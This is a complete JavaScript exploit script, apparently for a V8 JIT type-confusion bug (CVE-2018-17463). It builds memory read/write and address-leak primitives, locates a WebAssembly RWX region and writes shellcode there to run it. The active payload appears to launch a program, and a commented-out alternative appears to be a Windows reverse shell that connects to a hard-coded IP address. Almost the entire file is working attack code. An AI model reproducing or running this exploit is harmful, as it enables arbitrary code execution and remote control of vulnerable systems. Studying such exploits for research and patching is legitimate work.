let MAX_VALUES = 32
let p1, p2;

let floatView = new Float64Array(1);
let uint64View = new BigUint64Array(floatView.buffer);

Number.prototype.toBigInt = function toBigInt() {
    floatView[0] = this;
    return uint64View[0];
};

BigInt.prototype.toNumber = function toNumber() {
    uint64View[0] = this;
    return floatView[0];
};

function hex(value) {
  if (value === undefined) return "undefined"
  return "0x" + value.toString(16)
}

function makeObj() {
  let obj = {inline: 1234};
  for (let i = 0; i < MAX_VALUES; i++) {
      Object.defineProperty(obj, 'p' + i, {
          writable: true,
          value: 0x4040 + i
      });
  }
  return obj;
}

function findOverlappingProperties() {
    // Create an array of all 32 property names such as p1..p32
    let pNames = [];
    for (let i = 0; i < MAX_VALUES; i++) {
        pNames[i] = 'p' + i;
    }

    let pValues = []
    for (let i = 0; i < MAX_VALUES; i++) {
        pValues[i] = 0x4040 + i;
    }

    // Create eval of our vuln function that will generate code during runtime
    eval(`
    function vuln(obj) {
      // Access Property inline of obj, forcing a CheckMap operation
      obj.inline;
      // Force a Map Transition via our side-effect
      this.Object.create(obj);
      // Trigger our type-confusion by accessing out-of-bound properties
      ${pNames.map((p) => `let ${p} = obj.${p};`).join('\n')}
      return [${pNames.join(', ')}];
    }
    `)

    // JIT code to trigger vuln
    for (let i = 0; i < 10000; i++) {
        // Create Object and pass it to Vuln function
        let res = vuln(makeObj());
        // Look for overlapping properties in results
        if (i === 9999) {
          for (let j = 0; j < res.length; j++) {
            valueToCompare = res[j] // res[j] from the DictionaryProperties
            if ((pValues.includes(valueToCompare)) && (pNames[pValues.indexOf(valueToCompare)] !== "p"+j)) { // check if value is found in original pValues
              index = pValues.indexOf(valueToCompare) // if it does get the index of the pValues to find the index of pNames (to know where in the DicionaryProperties can we control)
              p1 = pNames[index]
              p2 = "p"+j
              print("[-] Returning the first overlapping value found at " + p1 + " and " + p2 + ": " + hex(valueToCompare))
              return
            }
          } 
        }
    }
    throw "[!] Failed to find overlapping properties";
}

function testFoundOverlappingProperties(_p1, _p2) {
    // Create an array of all 32 property names such as p1..p32
    valueToTest = 0xbeef

    // Create eval of our vuln function that will generate code during runtime
    eval(`
    function vuln(obj) {
      obj.inline;
      this.Object.create(obj);
      return obj.${_p2}
    }
    `)

    // JIT code to trigger vuln
    for (let i = 0; i < 10000; i++) {
        eval(`
          let obj = makeObj();
          obj.${_p1} = ${valueToTest}
          let res = vuln(obj);
          if (i === 9999 && hex(res) !== "${hex(valueToTest)}") {
            throw "[!] Something fked up";
          }
        `)
    }
    print("[+] Control obtained!")
}

function makeSpecialObj_change_from_ints_to_objects() {
  let obj = {inline: 1234};
  for (let i = 0; i < MAX_VALUES; i++) {
      Object.defineProperty(obj, 'p' + i, {
          writable: true,
          value: { x: 0xdead }
      });
  }
  return obj;
}

function testFoundOverlappingProperties_change_from_ints_to_objects(_p1, _p2) {

    _p1_value = _p1.substr(1, _p1.length)
    _p2_value = _p2.substr(1, _p2.length)

    eval(`
    function vuln(obj) {
      obj.inline;
      this.Object.create(obj);
      return obj.${_p2}.x
    }
    `)

    for (let i = 0; i < 10000; i++) {
        eval(`
          let obj = makeSpecialObj();
          obj.${_p2} = { x: 0xcafe }
          obj.${_p1} = { x: 0x5678 }
          let res = vuln(obj);
          if (i === 1) { print(hex(res)) } // should return 0xcafe
          if (i === 9999) { print(hex(res)) } // should return 0x5678
        `)
    }
}

function makeSpecialObj_must_be_done_this_way(must_pass_values_here) {
  let obj = {inline: 1234};
  for (let i = 0; i < MAX_VALUES; i++) {
      Object.defineProperty(obj, 'p' + i, {
          writable: true,
          value: must_pass_values_here[i]
      });
  }
  return obj;
}

function retrieveAddrOfFakeObjPrimative(_p1, _p2) {

    _p1_value = _p1.substr(1, _p1.length)
    _p2_value = _p2.substr(1, _p2.length)

    eval(`
    function vuln(obj) {
      obj.inline;
      this.Object.create(obj);
      return obj.${_p2}.x
    }
    `)

    pValues = []
    for (let i = 0; i < MAX_VALUES ; i++) {
        pValues = {x:0}
    }

    let floatToBeCorrupted = 1.1
    let objToLeak = { anything: 0xcafe }
    pValues[parseInt(_p1_value)] = {cannotbex:objToLeak}
    pValues[parseInt(_p2_value)] = {x:floatToBeCorrupted}

    for (let i = 0; i < 10000; i++) {
      let res = vuln(makeSpecialObj_must_be_done_this_way(pValues));
      if (res !== floatToBeCorrupted) {
        print("[*] We managed to leak an object by messing around with the map/shape!");
        let floatView = new Float64Array(1);
        floatView[0] = res;
        let uint64View = new BigUint64Array(floatView.buffer);
        print("[*] Verify that objToLeak address is: 0x" + uint64View[0].toString(16));
        // %DebugPrint(objToLeak)
        break
      }
    }
}

function writeFakeObjPrimative(_p1, _p2) {

    _p1_value = _p1.substr(1, _p1.length)
    _p2_value = _p2.substr(1, _p2.length)

    eval(`
    function vuln(obj) {
      obj.inline;
      this.Object.create(obj);
      let addressOfFakeObjToLeak = obj.${_p2}.x
      obj.${_p2}.x = 0x41414141
      return addressOfFakeObjToLeak
    }
    `)

    pValues = []
    for (let i = 0; i < MAX_VALUES ; i++) {
        pValues = {x:0}
    }

    let floatToBeCorrupted = 1.1
    let objToLeak = { anything: 0xcafe }
    pValues[parseInt(_p1_value)] = {cannotbex:objToLeak}
    // pValues[parseInt(_p1_value)] = objToLeak // this is fine as well
    pValues[parseInt(_p2_value)] = {x:floatToBeCorrupted}

    for (let i = 0; i < 10000; i++) {
      let res = vuln(makeSpecialObj_must_be_done_this_way(pValues));
      if (res !== floatToBeCorrupted) {
        print("[7] Verify that we can write 0x41414141: " + hex(res))
        break
      }
    }
}

function retrieveAddrOfFakeObjPrimative_useArgument(_p1, _p2, _obj_to_make_rw_primative) {

    _p1_value = _p1.substr(1, _p1.length)
    _p2_value = _p2.substr(1, _p2.length)

    eval(`
    function vuln(obj) {
      obj.inline;
      this.Object.create(obj);
      let addressOfFakeObjToLeak = obj.${_p2}.x
      return addressOfFakeObjToLeak
    }
    `)

    pValues = []
    for (let i = 0; i < MAX_VALUES ; i++) {
        pValues = {x:0}
    }

    let floatToBeCorrupted = 1.1
    pValues[parseInt(_p1_value)] = {cannotbex:_obj_to_make_rw_primative}
    pValues[parseInt(_p2_value)] = {x:floatToBeCorrupted}

    for (let i = 0; i < 10000; i++) {
      let res = vuln(makeSpecialObj_must_be_done_this_way(pValues));
      if (res !== floatToBeCorrupted) {
        print("[*] We managed to leak an object by messing around with the map/shape!");
        let floatView = new Float64Array(1);
        floatView[0] = res;
        let uint64View = new BigUint64Array(floatView.buffer);
        print("[*] Leaking arrayBuffer_2 address (w/o DebugPrint): 0x" + uint64View[0].toString(16));
        return uint64View[0];
      }
    }
}

function writeFakeObjPrimative_useArgument(_p1, _p2, _obj_to_make_rw_primative, _value_to_write) {

    _p1_value = _p1.substr(1, _p1.length)
    _p2_value = _p2.substr(1, _p2.length)

    eval(`
    function vuln(obj) {
      obj.inline;
      this.Object.create(obj);
      let addressOfFakeObjToLeak = obj.${_p2}.x
      obj.${_p2}.x = ${_value_to_write}
      return addressOfFakeObjToLeak
    }
    `)

    pValues = []
    for (let i = 0; i < MAX_VALUES ; i++) {
        pValues = {x:0}
    }

    let floatToBeCorrupted = 1.1
    let objToLeak = { anything: 0xcafe }
    pValues[parseInt(_p1_value)] = {cannotbex:objToLeak}
    // pValues[parseInt(_p1_value)] = objToLeak // this is fine as well
    pValues[parseInt(_p2_value)] = {x:floatToBeCorrupted}

    for (let i = 0; i < 10000; i++) {
      let res = vuln(makeSpecialObj_must_be_done_this_way(pValues));
      if (res !== floatToBeCorrupted) {
        print(`[7] Verify that we can write ${hex(_value_to_write)}: ${hex(res)}`)
        break
      }
    }
}

// if we use 2 properties here, then our fakeObj must also use 2 primatives
// _value_to_write is value we going to write to the _obj_to_make_rw_primative
function retrieveAddrOfFakeObjPrimative_useArgument_andUseTwoPropertiesObj(_p1, _p2, _obj_to_make_rw_primative) {

    _p1_value = _p1.substr(1, _p1.length)
    _p2_value = _p2.substr(1, _p2.length)

    eval(`
    function vuln(obj) {
      obj.inline;
      this.Object.create(obj);
      let addressOfFakeObjToLeak = obj.${_p2}.x1 
      return addressOfFakeObjToLeak
    }
    `)

    pValues = []
    for (let i = 0; i < MAX_VALUES ; i++) {
        pValues = {x1:0,x2:0}
    }

    let x1_value = 1.1123
    let x2_value = 1.2123
    pValues[parseInt(_p1_value)] = {canbeanythingbutmustbesomething:_obj_to_make_rw_primative}
    pValues[parseInt(_p2_value)] = {x1:x1_value, x2:x2_value}

    for (let i = 0; i < 10000; i++) {
      let res = vuln(makeSpecialObj_must_be_done_this_way(pValues));
      if (res !== x1_value) {
        print("[*] We managed to leak an object by messing around with the map/shape!");
        let floatView = new Float64Array(1);
        floatView[0] = res;
        let uint64View = new BigUint64Array(floatView.buffer);
        print("[*] Leaking arrayBuffer_2 address (w/o DebugPrint): 0x" + uint64View[0].toString(16));
        return uint64View[0]-1n; // work with bigint
        //return uint64View[0];
      }
    }
    throw "[!] fked up"
}

// instead of using { x: float }, we will use { val: float, x: float } to access backing store 
// _value_to_write is value we going to write to the _obj_to_make_rw_primative
function writeFakeObjPrimative_useArgument_andUseTwoPropertiesObj(_p1, _p2, _obj_to_make_rw_primative, _value_to_write) {

    _p1_value = _p1.substr(1, _p1.length)
    _p2_value = _p2.substr(1, _p2.length)

    eval(`
    function vuln(obj) {
      obj.inline;
      this.Object.create(obj);
      let addressOfFakeObjToLeak = obj.${_p2}.x2;
      obj.${_p2}.x2 = ${_value_to_write}; // must be a number type
      return addressOfFakeObjToLeak // should match _value_to_write
    }
    `)

    pValues = []
    for (let i = 0; i < MAX_VALUES ; i++) {
        pValues = {x1:0, x2:0}
    }

    let x1_value = 1.21212
    let x2_value = 1.11212
    pValues[parseInt(_p1_value)] = _obj_to_make_rw_primative // cannot wrap in object fml, this value is going to replace {fv:floatToBeCorruptedfv, sv:floatToBeCorruptedsv}
    pValues[parseInt(_p2_value)] = {x1:x1_value, x2:x2_value}

    for (let i = 0; i < 10000; i++) {
      let res = vuln(makeSpecialObj_must_be_done_this_way(pValues));
    }
}

// each time you run the script, the overlap properties will change
// but within each run, the overlap properties will remain the same no matter the number of times your run the exploit function

print("[+] Finding Overlapping Properties...");
findOverlappingProperties();
print(`[+] Properties ${p1} and ${p2} overlap!`);
//findOverlappingProperties();
//print(`[+] Properties ${p1} and ${p2} overlap! (Must be the same as the previous run)`);
//testFoundOverlappingProperties(p1, p2);

let arrayBuffer_1 = new ArrayBuffer(1024);
let arrayBuffer_2 = new ArrayBuffer(1024);
//retrieveAddrOfFakeObjPrimative(p1, p2);
//writeFakeObjPrimative(p1, p2);
//address_of_array_buffer_2 = retrieveAddrOfFakeObjPrimative_useArgument(p1, p2, arrayBuffer_2);
//writeFakeObjPrimative_useArgument(p1, p2, arrayBuffer_1, address_of_array_buffer_2);
address_of_array_buffer_2 = retrieveAddrOfFakeObjPrimative_useArgument_andUseTwoPropertiesObj(p1, p2, arrayBuffer_2);
writeFakeObjPrimative_useArgument_andUseTwoPropertiesObj(p1, p2, arrayBuffer_1, address_of_array_buffer_2.toNumber());

let view1 = new BigUint64Array(arrayBuffer_1)
print(view1)
let originalArrBuf2BackingStore = view1[4] // at 5th qword, see README.md
print(`[+] ArrayBuffer_2 Backing Store: 0x${originalArrBuf2BackingStore.toString(16)}`);
print("[%] We can leak ArrayBuffer_2 related content via ArrayBuffer_1");

let memory = {
    write(addr, bytes) {
        view1[4] = addr;
        let view2 = new Uint8Array(arrayBuffer_2);
        view2.set(bytes);
    },
    read64(addr) {
        view1[4] = addr;
        let view2 = new BigUint64Array(arrayBuffer_2);
        return view2[0];
    },
    write64(addr, ptr) {
        view1[4] = addr;
        let view2 = new BigUint64Array(arrayBuffer_2);
        view2[0] = ptr;
    },
    addrOf(obj) {
        arrayBuffer_2.leakMe = obj;
        let props = this.read64(address_of_array_buffer_2 + 8n) - 1n; // debug yourself via %DebugPrint
        return this.read64(props + 16n) - 1n;
    }
};

print("[+] Generating a WebAssembly Instance...");
// Generate RWX region for Shellcode via WASM
var wasmCode = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 133, 128, 128, 128, 0, 1, 96, 0, 1, 127, 3, 130, 128, 128, 128, 0, 1, 0, 4, 132, 128, 128, 128, 0, 1, 112, 0, 0, 5, 131, 128, 128, 128, 0, 1, 0, 1, 6, 129, 128, 128, 128, 0, 0, 7, 145, 128, 128, 128, 0, 2, 6, 109, 101, 109, 111, 114, 121, 2, 0, 4, 109, 97, 105, 110, 0, 0, 10, 138, 128, 128, 128, 0, 1, 132, 128, 128, 128, 0, 0, 65, 42, 11]);
var wasmModule = new WebAssembly.Module(wasmCode);
var wasmInstance = new WebAssembly.Instance(wasmModule);
var func = wasmInstance.exports.main;

// Leak Web Assembly Instance Address and Jump Table Start Pointer
print("[+] Leaking WebAssembly Instance Address...");
let wasmInstanceAddr = memory.addrOf(wasmInstance);
print(`[+] WebAssembly Instance Address @ 0x${wasmInstanceAddr.toString(16)}`);
let wasmRWXAddr = memory.read64(wasmInstanceAddr + 0xF0n);
print(`[+] WebAssembly RWX Jump Table Address @ 0x${wasmRWXAddr.toString(16)}`);
print("[+] Preparing Shellcode...");
let shellcode = new Uint8Array([0x48, 0x31, 0xff, 0x48, 0xf7, 0xe7, 0x65, 0x48, 0x8b, 0x58, 0x60, 0x48, 0x8b, 0x5b, 0x18, 0x48, 0x8b, 0x5b, 0x20, 0x48, 0x8b, 0x1b, 0x48, 0x8b, 0x1b, 0x48, 0x8b, 0x5b, 0x20, 0x49, 0x89, 0xd8, 0x8b, 0x5b, 0x3c, 0x4c, 0x01, 0xc3, 0x48, 0x31, 0xc9, 0x66, 0x81, 0xc1, 0xff, 0x88, 0x48, 0xc1, 0xe9, 0x08, 0x8b, 0x14, 0x0b, 0x4c, 0x01, 0xc2, 0x4d, 0x31, 0xd2, 0x44, 0x8b, 0x52, 0x1c, 0x4d, 0x01, 0xc2, 0x4d, 0x31, 0xdb, 0x44, 0x8b, 0x5a, 0x20, 0x4d, 0x01, 0xc3, 0x4d, 0x31, 0xe4, 0x44, 0x8b, 0x62, 0x24, 0x4d, 0x01, 0xc4, 0xeb, 0x32, 0x5b, 0x59, 0x48, 0x31, 0xc0, 0x48, 0x89, 0xe2, 0x51, 0x48, 0x8b, 0x0c, 0x24, 0x48, 0x31, 0xff, 0x41, 0x8b, 0x3c, 0x83, 0x4c, 0x01, 0xc7, 0x48, 0x89, 0xd6, 0xf3, 0xa6, 0x74, 0x05, 0x48, 0xff, 0xc0, 0xeb, 0xe6, 0x59, 0x66, 0x41, 0x8b, 0x04, 0x44, 0x41, 0x8b, 0x04, 0x82, 0x4c, 0x01, 0xc0, 0x53, 0xc3, 0x48, 0x31, 0xc9, 0x80, 0xc1, 0x07, 0x48, 0xb8, 0x0f, 0xa8, 0x96, 0x91, 0xba, 0x87, 0x9a, 0x9c, 0x48, 0xf7, 0xd0, 0x48, 0xc1, 0xe8, 0x08, 0x50, 0x51, 0xe8, 0xb0, 0xff, 0xff, 0xff, 0x49, 0x89, 0xc6, 0x48, 0x31, 0xc9, 0x48, 0xf7, 0xe1, 0x50, 0x48, 0xb8, 0x9c, 0x9e, 0x93, 0x9c, 0xd1, 0x9a, 0x87, 0x9a, 0x48, 0xf7, 0xd0, 0x50, 0x48, 0x89, 0xe1, 0x48, 0xff, 0xc2, 0x48, 0x83, 0xec, 0x20, 0x41, 0xff, 0xd6]);
// shellcode = new Uint8Array([0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44, 0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x49, 0xbe, 0x77, 0x73, 0x32, 0x5f, 0x33, 0x32, 0x00, 0x00, 0x41, 0x56, 0x49, 0x89, 0xe6, 0x48, 0x81, 0xec, 0xa0, 0x01, 0x00, 0x00, 0x49, 0x89, 0xe5, 0x49, 0xbc, 0x02, 0x00, 0x04, 0xf6, 0xc0, 0xa8, 0xd5, 0x80, 0x41, 0x54, 0x49, 0x89, 0xe4, 0x4c, 0x89, 0xf1, 0x41, 0xba, 0x4c, 0x77, 0x26, 0x07, 0xff, 0xd5, 0x4c, 0x89, 0xea, 0x68, 0x01, 0x01, 0x00, 0x00, 0x59, 0x41, 0xba, 0x29, 0x80, 0x6b, 0x00, 0xff, 0xd5, 0x50, 0x50, 0x4d, 0x31, 0xc9, 0x4d, 0x31, 0xc0, 0x48, 0xff, 0xc0, 0x48, 0x89, 0xc2, 0x48, 0xff, 0xc0, 0x48, 0x89, 0xc1, 0x41, 0xba, 0xea, 0x0f, 0xdf, 0xe0, 0xff, 0xd5, 0x48, 0x89, 0xc7, 0x6a, 0x10, 0x41, 0x58, 0x4c, 0x89, 0xe2, 0x48, 0x89, 0xf9, 0x41, 0xba, 0x99, 0xa5, 0x74, 0x61, 0xff, 0xd5, 0x48, 0x81, 0xc4, 0x40, 0x02, 0x00, 0x00, 0x49, 0xb8, 0x63, 0x6d, 0x64, 0x00, 0x00, 0x00, 0x00, 0x00, 0x41, 0x50, 0x41, 0x50, 0x48, 0x89, 0xe2, 0x57, 0x57, 0x57, 0x4d, 0x31, 0xc0, 0x6a, 0x0d, 0x59, 0x41, 0x50, 0xe2, 0xfc, 0x66, 0xc7, 0x44, 0x24, 0x54, 0x01, 0x01, 0x48, 0x8d, 0x44, 0x24, 0x18, 0xc6, 0x00, 0x68, 0x48, 0x89, 0xe6, 0x56, 0x50, 0x41, 0x50, 0x41, 0x50, 0x41, 0x50, 0x49, 0xff, 0xc0, 0x41, 0x50, 0x49, 0xff, 0xc8, 0x4d, 0x89, 0xc1, 0x4c, 0x89, 0xc1, 0x41, 0xba, 0x79, 0xcc, 0x3f, 0x86, 0xff, 0xd5, 0x48, 0x31, 0xd2, 0x48, 0xff, 0xca, 0x8b, 0x0e, 0x41, 0xba, 0x08, 0x87, 0x1d, 0x60, 0xff, 0xd5, 0xbb, 0xf0, 0xb5, 0xa2, 0x56, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff, 0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb, 0x47, 0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90 ]);
print("[+] Writing Shellcode to Jump Table Address...");
memory.write(wasmRWXAddr, shellcode);
print("[+] Popping Shellcode...");
func();

// --allow-natives-syntax C:\users\babay\Ernest\Heap\CVE-2018-17463\new-exploit.js

// v8!v8::internal::Builtin_MathHypot